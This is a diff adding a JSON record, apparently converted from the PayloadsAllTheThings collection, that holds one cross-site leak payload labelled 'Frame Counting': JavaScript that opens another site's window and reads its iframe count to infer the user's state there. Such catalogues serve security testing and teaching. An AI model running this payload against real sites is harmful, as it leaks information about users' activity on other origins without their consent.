@@ -1,0 +1,21 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "xsleak",
+  "original_category": "XS-Leak",
+  "payloads": [
+    {
+      "category": "Frame Counting",
+      "escalation": "baseline",
+      "lines": [
+        "// Get a reference to the window",
+        "var win = window.open('https://example.org');",
+        "// Wait for the page to load",
+        "setTimeout(() => {",
+        "// Read the number of iframes loaded",
+        "console.log(\"%d iframes detected\", win.length);",
+        "}, 2000);"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.865Z"
+}
